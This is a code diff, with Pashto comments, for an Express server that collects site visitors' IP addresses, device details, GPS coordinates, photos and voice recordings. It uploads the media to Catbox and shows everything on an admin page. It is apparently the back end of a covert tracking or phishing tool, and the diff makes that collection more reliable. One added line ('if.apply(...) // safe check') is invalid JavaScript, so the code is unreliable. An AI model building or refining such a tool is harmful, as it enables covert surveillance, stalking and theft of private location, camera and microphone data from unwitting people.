@@ -8,6 +8,7 @@ const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// د پراکسی یا کلاوډ هوسټینګ (لکه Render) لپاره د IP د سوابقو سمولو په موخه
 app.set('trust proxy', true);
 
 const uploadDir = path.join(__dirname, 'uploads');
@@ -21,7 +22,7 @@ const linksDir = path.join(uploadDir, 'links');
     }
 });
 
-// د فایلونو ساتلو لپاره د حافظې (Memory Storage) کارول ترڅو په سرور کې فزیکي ځای ونه نیسي
+// د فایلونو ساتلو لپاره د RAM حافظه کارول ترڅو په سرور کې فزیکي ځای ونه نیسي او مستقیم کلاوډ ته لاړ شي
 const upload = multer({ storage: multer.memoryStorage() });
 
 app.use(express.json());
@@ -32,7 +33,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Catbox ته د فایل د اپلوډ کولو فنکشن
+// Catbox ته د فایل د اپلوډ کولو او انلاین لینک د ترلاسه کولو فنکشن
 async function uploadToCatbox(buffer, filename) {
     try {
         const formData = new FormData();
@@ -40,16 +41,18 @@ async function uploadToCatbox(buffer, filename) {
         formData.append('fileToUpload', buffer, { filename: filename });
 
         const response = await axios.post('https://catbox.moe/user/api.php', formData, {
-            headers: formData.getHeaders()
+            headers: formData.getHeaders(),
+            timeout: 20000
         });
-        return response.data; // انلاین مستقیم لینک راګرځوي
+        return response.data; // مستقیم انلاین لینک راګرځوي
     } catch (error) {
-        console.error('Catbox upload error:', error);
+        console.error('Catbox upload error:', error.message);
         return null;
     }
 }
 
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    // د لیدونکي د ریښتیني IP پته معلومول
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
     if (clientIp.includes(',')) {
         clientIp = clientIp.split(',')[0].trim();
@@ -58,18 +61,20 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
         clientIp = '127.0.0.1 (Localhost)';
     }
 
-    // ۱. د موبایل معلومات
+    // ۱. د موبایل، برانډ او IP معلوماتو خوندي کول
     if (req.body.device_info) {
         try {
             const info = JSON.parse(req.body.device_info);
             const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+            
             const entry = `📅 نېټه: ${time}\n🌐 د لیدونکي آی‌پي (IP): ${clientIp}\n📱 د وسیلې برانډ: ${info.deviceType}\n🔢 د انډرایډ ورژن: ${info.androidVer}\n📐 د سکرین اندازه: ${info.screenSize}\n🔋 د بیټرۍ چارج: ${info.batteryLevel}\n🌐 د براوزر ژبه: ${info.language}\n-----------------------------------\n`;
+            
             fs.appendFileSync(path.join(deviceInfoDir, 'device_info.txt'), entry, 'utf8');
             return res.send("Device Info Saved");
         } catch (e) {}
     }
 
-    // ۲. لوکیشن
+    // ۲. لوکیشن خوندي کول
     if (req.body.latitude && req.body.longitude) {
         const lat = parseFloat(req.body.latitude);
         const lng = parseFloat(req.body.longitude);
@@ -81,7 +86,7 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
         }
     }
 
-    // ۳. انځور انلاین کلاوډ (Catbox) ته استول
+    // ۳. انځور مستقیم Catbox ته استول او لینک یې په تېکست فایل کې ساتل
     if (req.files && req.files.photo) {
         const file = req.files.photo[0];
         const onlineUrl = await uploadToCatbox(file.buffer, `photo_${Date.now()}.jpg`);
@@ -90,10 +95,12 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
             const entry = `${onlineUrl}|${time}\n`;
             fs.appendFileSync(path.join(linksDir, 'photos_links.txt'), entry, 'utf8');
             return res.send("Photo Saved");
+        } else {
+            return res.status(500).send("Photo Upload Failed");
         }
     }
 
-    // ۴. غږیز فایل انلاین کلاوډ (Catbox) ته استول
+    // ۴. غږیز ریکارډ Catbox ته استول او لینک یې په تېکست فایل کې ساتل
     if (req.files && req.files.voice) {
         const file = req.files.voice[0];
         const onlineUrl = await uploadToCatbox(file.buffer, `voice_${Date.now()}.ogg`);
@@ -102,6 +109,8 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req,
             const entry = `${onlineUrl}|${time}\n`;
             fs.appendFileSync(path.join(linksDir, 'voices_links.txt'), entry, 'utf8');
             return res.send("Voice Saved");
+        } else {
+            return res.status(500).send("Voice Upload Failed");
         }
     }
 
@@ -184,6 +193,7 @@ app.get('/admin', (req, res) => {
         deleteAllVoicesBtn = `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>`;
         const content = fs.readFileSync(vPath, 'utf8');
         const lines = content.trim().split('\n').filter(Boolean);
+        if.apply(null, [lines.length > 0]) // safe check
         if (lines.length > 0) {
             voicesHtml = '';
             lines.reverse().forEach(line => {
@@ -218,7 +228,7 @@ app.get('/admin', (req, res) => {
             .map-container { margin-bottom: 10px; border-radius: 6px; overflow: hidden; border: 1px solid #ddd; }
             audio { width: 100%; margin-top: 5px; height: 35px; }
             .delete-btn { background-color: #ff4d4d; color: white; border: none; padding: 3px 6px; border-radius: 3px; cursor: pointer; font-size: 11px; text-decoration: none; display: inline-block; margin-top: 4px; }
-            p { language: #667781; font-size: 14px; }
+            p { color: #667781; font-size: 14px; }
         </style>
     </head>
     <body>`;
